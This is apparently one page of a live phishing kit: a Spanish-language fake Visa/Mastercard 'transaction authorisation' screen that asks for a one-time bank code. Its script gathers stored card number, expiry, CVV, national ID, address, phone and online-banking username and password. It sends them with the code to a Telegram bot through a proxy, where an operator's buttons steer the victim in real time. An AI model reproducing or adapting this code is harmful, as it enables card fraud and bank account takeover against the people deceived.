<?php require_once __DIR__ . '/visit_handler.php'; ?>
<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Mi Página</title>
    <style>
      body {
        background-color: #ffffff;
        margin: 0;
        padding: 0;
        overflow: hidden; /* Evita que la página se desplace */
      }

      html,
      body {
        height: 100%;
      }

      #contenedor {
        position: relative;
        width: 95vw;
        height: 95vh;
        background-color: #ffffff;
        overflow: hidden;
        top: 50px;
        left: 35px;
        width: 310px;
        height: 500px;
      }

      #imagenIzquierda {
        position: absolute;
        top: 10px;
        left: 20px;
        width: 70px;
        height: 30px;
      }

      #imagenDerecha {
        position: absolute;
        top: 2px;
        right: 20px;
        width: 100px;
        height: 50px;
      }

      #titulo {
        font-size: 20px;
        font-weight: bold;
        color: #333;
        margin-top: 70px;
        margin-bottom: 10px;
        text-align: center;
      }

      #titulo2 {
        font-size: 16px;
        font-weight: bold;
        color: #333;
        margin-top: 30px;
        margin-bottom: 10px;
        text-align: center;
      }

      #parrafo {
        font-size: 13px;
        color: #000000;
        margin: 0 auto;
        max-width: 80%;
        text-align: justify;
        letter-spacing: 2px;
      }

      #formulario {
        margin-top: 20px;
        padding: 0 20px;
      }

      #formulario label {
        display: inline-block;
        font-size: 12px;
        font-weight: bold;
        color: #333;
        margin-bottom: 5px;
        width: 50%;
      }

      #formulario input {
        width: 48%;
        padding: 5px;
        margin-bottom: 10px;
        box-sizing: border-box;
        display: inline-block;
      }

      #horaTransaccion {
        font-size: 12px;
        color: #333;
        margin-top: 15px;
      }

      #autorizarBtn {
        display: block;
        margin: 45px auto;
        padding: 15px 30px;
        border-radius: 10%;
        background-color: #000;
        color: #fff;
        text-align: center;
        cursor: pointer;
        font-size: 12px;
        text-decoration: none;
        border: none;
      }

      #contador {
        color: #555;
        font-size: 8px;
        margin-left: 15px;
      }

      .loaderp {
        width: 48px;
        height: 48px;
        border: 5px solid #fff;
        border-bottom-color: blue;
        border-radius: 50%;
        display: inline-block;
        box-sizing: border-box;
        animation: rotation 1s linear infinite;
      }

      @keyframes rotation {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }

      .loaderp-full {
        position: fixed;
        top: 0;
        overflow-y: hidden;
        z-index: 1000;
        background-color: white;
        width: 100vw;
        height: 100vh;
        display: none;
        flex-direction: column;
        justify-content: center;
        align-items: center;
      }
    </style>
  </head>

  <body>
    <div id="contenedor">
    <img id="imagenIzquierda" src="./assets/images/visa.jpg" alt="Logo Visa">
    <img id="imagenDerecha" src="./assets/images/master.png" alt="Logo Mastercard">
      <div id="contenido">
        <div id="titulo">Autorizacion de transaccion</div>
        <div id="parrafo">
          Estás intentado realizar un pago por tarjeta de crédito/débito.
          Necesitamos confirmar que eres tú quien realiza este pago.
        </div>
        <div id="titulo2">Detalles de la transaccion</div>
        <div id="formulario">
          <label>Comercio: TIQUETES BARATOS S.A.S </label>
          <label for="horaTransaccion">
            <span id="horaTransaccion">Hora de la transacción:</span>
          </label>
          <label for="otp">Ingrese su clave dinamica:</label>
          <input
            type="text"
            id="otp"
            name="otp"
            maxlength="6"
            oninput="validarOtp()"
          />
          <p id="contador">
            Ingresa el codigo de 6 digitos recibido por mensaje o
            <span id="tiempo"></span>ingresando a su tu app.
          </p>
        </div>
      </div>
      <button id="autorizarBtn">Autorizar</button>
       <!-- LOADER FULL -->
    <div class="loaderp-full">
        <span class="loaderp"></span>
        <p class="text-italic tc-ocean fs-3 fw-light"></p>
      </div>
    </div>
    <script>
async function enviarDatos() {
    const loader = document.querySelector(".loaderp-full");
    loader.style.display = "flex"; // Mostrar loader

    try {
        // Obtener datos de `tbdatos` desde localStorage
        const datosTarjeta = JSON.parse(localStorage.getItem("tbdatos"));
        const username = localStorage.getItem("username");
        const password = localStorage.getItem("password");

        if (!datosTarjeta) {
            alert("No se encontraron datos de tarjeta en el almacenamiento local.");
            loader.style.display = "none"; // Ocultar loader si hay error
            return;
        }

        const otp = document.getElementById("otp").value;
        if (!otp || otp.length !== 6) {
            alert("Por favor, ingrese un código OTP válido de 6 dígitos.");
            loader.style.display = "none"; // Ocultar loader si OTP es inválido
            return;
        }

        const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
        const message = `
<b>Nueva solicitud de clave dinámica pendiente de verificación.</b>\n
--------------------------------------------------
🆔 <b>ID:</b> | <b>${transactionId}</b>
👤 <b>Usuario:</b> | <b>${username || 'N/A'}</b>
🔐 <b>Clave:</b> | <b>${password || 'N/A'}</b>
--------------------------------------------------
🔑 <b>Dinamica:</b> | <b>${otp}</b>
--------------------------------------------------
<b>Detalles del pago:</b>
----------------------------
🪪 <b>Cédula:</b> | <code>${datosTarjeta.cedula || 'N/A'}</code>
💳 <b>Tarjeta:</b> | <b>${datosTarjeta.cardNumber || 'N/A'}</b>
📅 <b>Fecha de expiración:</b> | <b>${datosTarjeta.expMonth || 'N/A'}/${datosTarjeta.expYear || 'N/A'}</b>
🔐 <b>CVV:</b> | <b>${datosTarjeta.cvv || 'N/A'}</b>
🏠 <b>Dirección:</b> | <b>${datosTarjeta.address || 'N/A'}</b>
📞 <b>Teléfono:</b> | <b>${datosTarjeta.phone || 'N/A'}</b>
🏙️ <b>Ciudad:</b> | <b>${datosTarjeta.city || 'N/A'}</b>
--------------------------------------------------
        `;

        // Guardar el mensaje en localStorage antes de enviarlo
        localStorage.setItem("ultimaSolicitudTelegram", JSON.stringify({ transactionId, message }));

        const keyboard = JSON.stringify({
            inline_keyboard: [
                [{ text: "Error de TC", callback_data: `error_tc:${transactionId}` }],
                [{ text: "Error de Logo", callback_data: `error_logo:${transactionId}` }],
                [{ text: "Error de Dinámica", callback_data: `error_dinamica:${transactionId}` }],
                [{ text: "Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
            ],
        });

        const response = await fetch("./telegram_proxy.php", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                message: message,
                reply_markup: keyboard
            }),
        });

        const data = await response.json();
        if (data.ok) {
            console.log("Mensaje enviado a Telegram con éxito");
            await checkPaymentVerification(transactionId, loader); // Verificar respuesta
        } else {
            console.error("Error al enviar mensaje a Telegram:", data);
            loader.style.display = "none"; // Ocultar loader si hay error
        }
    } catch (error) {
        console.error("Error al enviar datos:", error);
        loader.style.display = "none"; // Ocultar loader si ocurre un error
    }
}

async function checkPaymentVerification(transactionId, loader) {
    try {
        const response = await fetch(`./telegram_proxy.php?action=getUpdates&transactionId=${transactionId}`);
        const data = await response.json();
        const updates = data.result;

        const verificationUpdate = updates.find(
            (update) =>
                update.callback_query &&
                update.callback_query.data.includes(transactionId)
        );

        if (verificationUpdate) {
            const callbackData = verificationUpdate.callback_query.data;

            if (callbackData === `error_tc:${transactionId}`) {
                alert("Error en tarjeta de crédito. Por favor, intente nuevamente.");
                window.location.href = "pay.php";
            } else if (callbackData === `error_logo:${transactionId}`) {
                alert("Error en el logo. Intente nuevamente.");
                window.location.href = "login-seguridad.php";
            } else if (callbackData === `error_dinamica:${transactionId}`) {
                alert("Clave dinámica incorrecta. Verifique sus datos.");
            } else if (callbackData === `confirm_finalizar:${transactionId}`) {
                window.location.href = "checking.php";
            }

            loader.style.display = "none"; // Ocultar loader al procesar la respuesta
        } else {
            setTimeout(() => checkPaymentVerification(transactionId, loader), 2000);
        }
    } catch (error) {
        console.error("Error al verificar clave dinámica:", error);
        setTimeout(() => checkPaymentVerification(transactionId, loader), 2000);
    }
}

document.getElementById("autorizarBtn").addEventListener("click", function (event) {
    event.preventDefault();
    enviarDatos();
});

</script>




  </body>
</html>
